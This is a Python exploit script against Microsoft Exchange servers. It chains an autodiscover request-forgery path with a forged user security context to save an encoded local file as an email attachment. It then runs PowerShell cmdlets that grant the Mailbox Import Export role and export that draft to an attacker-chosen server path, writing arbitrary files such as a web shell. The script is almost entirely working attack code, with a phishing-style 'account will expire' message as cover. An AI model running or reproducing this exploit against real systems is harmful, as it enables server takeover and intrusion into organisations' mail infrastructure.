#!/usr/bin/env python3

import sys

xmodule = __import__("34473")


def pstb64Enc(localfile):
    replist = [
         71, 241, 180, 230,  11, 106, 114,  72,
        133,  78, 158, 235, 226, 248, 148,  83,
        224, 187, 160,   2, 232,  90,   9, 171,
        219, 227, 186, 198, 124, 195,  16, 221,
         57,   5, 150,  48, 245,  55,  96, 130,
        140, 201,  19,  74, 107,  29, 243, 251,
        143,  38, 151, 202, 145,  23,   1, 196,
         50,  45, 110,  49, 149, 255, 217,  35,
        209,   0,  94, 121, 220,  68,  59,  26,
         40, 197,  97,  87,  32, 144,  61, 131,
        185,  67, 190, 103, 210,  70,  66, 118,
        192, 109,  91, 126, 178,  15,  22,  41,
         60, 169,   3,  84,  13, 218,  93, 223,
        246, 183, 199,  98, 205, 141,   6, 211,
        105,  92, 134, 214,  20, 247, 165, 102,
        117, 172, 177, 233,  69,  33, 112,  12,
        135, 159, 116, 164,  34,  76, 111, 191,
         31,  86, 170,  46, 179, 120,  51,  80,
        176, 163, 146, 188, 207,  25,  28, 167,
         99, 203,  30,  77,  62,  75,  27, 155,
         79, 231, 240, 238, 173,  58, 181,  89,
          4, 234,  64,  85,  37,  81, 229, 122,
        137,  56, 104,  82, 123, 252,  39, 174,
        215, 189, 250,   7, 244, 204, 142,  95,
        239,  53, 156, 132,  43,  21, 213, 119,
         52,  73, 182,  18,  10, 127, 113, 136,
        253, 157,  24,  65, 125, 147, 216,  88,
         44, 206, 254,  36, 175, 222, 184,  54,
        200, 161, 128, 166, 153, 152, 168,  47,
         14, 129, 101, 115, 228, 194, 162, 138,
        212, 225,  17, 208,   8, 139,  42, 242,
        237, 154, 100,  63, 193, 108, 249, 236
    ]

    with open(localfile) as filei:
        file_str = filei.read()
    payload_str = "".join(chr(replist[ord(c)]) for c in file_str)

    return xmodule.b64encode(payload_str.encode("latin-1")).decode()

def deliverPayload(target, payload, usera, sid, token):
    ex_headers = {
        "User-Agent": xmodule.user_agent,
        "Cookie": "email=autodiscover/autodiscover.json/@gmail.com",
        "Content-Type": "text/xml",
    }
    ews_data = f"""<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
            xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
            xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Header>
                <t:RequestServerVersion Version="Exchange2016" />
                <t:SerializedSecurityContext>
                    <t:UserSid>{sid}</t:UserSid>
                    <t:GroupSids>
                        <t:GroupIdentifier>
                            <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
                        </t:GroupIdentifier>
                    </t:GroupSids>
                </t:SerializedSecurityContext>
            </soap:Header>
            <soap:Body>
                <m:CreateItem MessageDisposition="SaveOnly">
                    <m:Items>
                        <t:Message>
                            <t:Subject>[Your Account Will Expire]</t:Subject>
                            <t:Body BodyType="HTML">
                                Dear {usera}, your account will expire: &lt;br&gt;
                                &lt;ol&gt;
                                    &lt;li&gt;Click on the &lt;a href=&quot;/owa/&quot;&gt;hyperlink&lt;/a&gt; to reset valid date&lt;/li&gt;
                                    &lt;li&gt;Follow the OperatingManual.pdf&lt;/li&gt;
                                &lt;/ol&gt;
                                &lt;br&gt;----------------------------------------
                                &lt;br&gt;IT Support &lt;a href=&quot;mailto:{usera}&quot;&gt;{usera}&lt;/a&gt;
                            </t:Body>
                            <t:Attachments>
                                <t:FileAttachment>
                                    <t:Name>OperatingManual.pdf</t:Name>
                                    <t:IsInline>false</t:IsInline>
                                    <t:IsContactPhoto>false</t:IsContactPhoto>
                                    <t:Content>{payload}</t:Content>
                                </t:FileAttachment>
                            </t:Attachments>
                            <t:ToRecipients>
                                <t:Mailbox>
                                    <t:EmailAddress>{usera}</t:EmailAddress>
                                </t:Mailbox>
                            </t:ToRecipients>
                        </t:Message>
                    </m:Items>
                </m:CreateItem>
            </soap:Body>
        </soap:Envelope>
    """
    resx = xmodule.req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/ews/exchange.asmx?X-Rps-CAT={token}", headers=ex_headers, data=ews_data, verify=False)

    return True if resx.status_code == 200 else False

def main(argv):
    server = argv[1]
    localfile = argv[2]
    remotepath = argv[3]
    target = f"https://{server}"

    usera, sid, token = xmodule.exploit(target)
    payload = pstb64Enc(localfile)
    isdeliver = deliverPayload(target, payload, usera, sid, token)
    if isdeliver == False:
        print("[-] Try to deliver payload by email")
        exit(0)

    print("\033[92m[*] Write File:\033[0m")
    xmodule.execmdlet(server, token, pscript="New-ManagementRoleAssignment -Role \"Mailbox Import Export\" -User \"administrator\"")
    xmodule.execmdlet(server, token, pscript="Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false")
    xmodule.execmdlet(server, token, pscript=f"New-MailboxExportRequest -Mailbox {usera} -IncludeFolders \"#Drafts#\" -FilePath {remotepath} -ContentFilter \"(Subject -eq '[Your Account Will Expire]')\"")


if __name__ == "__main__":
    try:
        main(sys.argv)
    except IndexError:
        print("Usage: python3 31207.py 1.1.1.1 [Local File Path] [UNC Absolute Path]")